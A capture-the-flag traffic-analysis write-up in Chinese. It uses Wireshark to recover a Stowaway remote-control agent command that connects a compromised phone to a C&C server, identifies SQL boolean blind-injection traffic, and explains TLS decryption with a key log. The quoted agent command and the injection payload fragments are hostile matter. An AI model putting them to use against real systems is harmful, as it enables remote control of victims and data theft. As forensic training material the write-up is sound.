二.解题步骤

问（1）

2.1-1 在过滤栏输入tcp，筛选可疑流量

2.1-2 任意选中一条tcp数据包，右键——追踪流——TCP流，依次浏览每一天会话内容，发现大部分都是乱码

2.1-3 浏览到tcp.stream eq 15时，可以看到关键会话：

./ios_agent -c 3.128.156.159:8081 -s hack4sec

  • ios_agent：被植入到受害者手机上的远控客户端程序
  • -c IP:端口：connect，连接到黑客 C&C 服务器地址
    • IP：3.128.156.159
    • 端口：8081
  • -s 字符串：secret，客户端与 C&C 服务器之间通信的加密密钥

2.1-4 可以知道flag为3.128.156.159

问（2）

2.2-1 在过滤栏输入tcp contains "ios_agent"

2.2-2 得到和问（1）一致的关键会话

2.2-3 搜索命令特征：gent -c ip:port -s secret，发现是开源多级代理工具stowaway的标志性启动参数

2.2-4 所以github开源项目的名字就是stowaway

问（3）

2.3-1 和问（2）一样在过滤栏输入tcp contains "ios_agent"

2.3-2 依旧得到关键会话：

./ios_agent -c 3.128.156.159:8081 -s hack4sec

2-3-3 得到密钥为hack4sec

2.4-2

2.4-3 在过滤栏输入ip.src == 192.168.1.12 && http2

2.4-4 任意选中一条HTTP2数据包，在下方窗口展开

Hypertext Transfer Protocol 2 —— Header + Data 就能看到GET请求的URI，然后URI解码即可

  • 无延迟——猜错

三.相关知识点

3.1 Stowaway（偷渡者）

Stowaway 是一款多级反弹代理工具，黑客常在靶机植入 agent 客户端，主动连接黑客的 C&C 服务器上线，‑c、‑s 是该工具最标志性的启动参数，流量题看到这个命令基本就可以直接提取 IP 和密钥。

3.2 Stowaway固定参数

  • ios_agent：被植入到受害者手机上的远控客户端程序
  • -c IP:端口：connect，连接到黑客 C&C 服务器地址
  • -s 字符串：secret，客户端与 C&C 服务器之间通信的加密密钥

3.3

  • 问（4）中为什么过滤栏要加http2？

3.3-1 Stowaway 远控流量（ios‑agent）是TCP 原始流量，走的 8081 端口

3.3-2 SQL 盲注是另外一条独立流量：手机浏览器发起 HTTPS 访问，用 HTTP2

3.3-3 如果只写ip.addr == 192.168.1.12，会把远控 stowaway、wifi 流量、网站访问等所有杂乱数据包全部筛出来；

加上http2就精准锁定网站访问，过滤掉无关远控流量

  • 为什么不用之前的C&C服务器IP3.128.156.159？

1. 3.128.156.159：Stowaway 远控服务器 IP（问1答案，用来远程控制手机）

2. SQL 盲注攻击：不是直接访问黑客 C&C 服务器，而是黑客控制你的手机，让手机去攻击第三方网站，发出注入数据包。所以盲注流量的目标 IP不是3.128.156.159，而是被攻击 Web 站点的公网 IP

  • 解密后怎么确认这就是盲注包？ 导入keylog.txt解密 TLS 流量以后，追踪http2流，你就可以看到 URL里带有 if((select hex(password))) 这类布尔盲注 Payload

3.4 布尔盲注

  • substr(password,1,1)：取出密码第1个字符
  • hex( )：把字符转为十六进制
  • >：做大小比较（逐字符猜解）
  • 如果条件成立 —— 页面延时响应 sleep (1)，代表猜对了字符

3.5 什么是TLS？

TLS（Transport Layer Security，传输层安全协议），就是现在网站用来加密 HTTPS的一套规则。

  • 以前的 HTTP：明文传输，流量抓包直接看见网址、参数、密码，任何人抓包都可以看内容。
  • HTTPS= HTTP + TLS 加密。 浏览器/手机和服务器之间传输的数据全部变成密文，就算你抓到数据包，肉眼看到的也是一堆乱码，看不到请求参数。

3.6 怎么解开TLS？

3.6-1 Pre‑Master‑Secret 日志文件（key.log）方案【客户端密钥】（最常用，浏览器抓包）：浏览器在TLS握手时生成Pre‑Master‑Secret，把这个密钥写入key.log。Wireshark 利用这份密钥，解密后续所有加密报文。

  • 适用场景：你能控制客户端（Chrome、Edge、Firefox），抓包时同步生成密钥日志。

3.6-2 RSA 私钥解密方案【服务端私钥】（拿到网站服务器证书私钥）

  • 适用场景：你拥有目标 Web 服务器，导出它的证书私钥。

3.7 TLS握手

握手就是 客户端 (浏览器 / 手机) 和 网站服务器，在正式传输数据之前，先进行的一轮 “暗号协商对话”。 目的：商量好加密规则、生成会话密钥，之后双方所有数据都用这个密钥加密传输，别人窃听也看不懂。

  • 在抓包里可以看到4个核心报文

1. Client Hello（客户端问候）

客户端发起连接。告诉服务器：我支持哪些 TLS 版本、哪些加密套件、随机数。

2. Server Hello（服务器问候）

服务器返回消息。选定双方都认可的 TLS 版本、加密套件，发送服务器生成的随机数。

3. 服务器下发证书 (Certificate)

服务器把自己的 HTTPS 证书发给客户端，用来证明自己是合法网站。

4. 双方交换材料，算出 Pre‑Master‑Secret（预主密钥）

客户端与服务器各自运算，得到完全一样的会话密钥。 握手到此完成

3.8 TLS加密通信流程

1. 手机 ↔ Web 服务器握手，协商加密规则、生成密钥

2. 手机发送盲注请求：/info?l=1&o=(case when ...)，先被 TLS 加密成二进制密文，再发出去

3. Wireshark抓到加密后的数据包

4. Wireshark使用key.log里面的密钥解密，还原出原始明文 URL
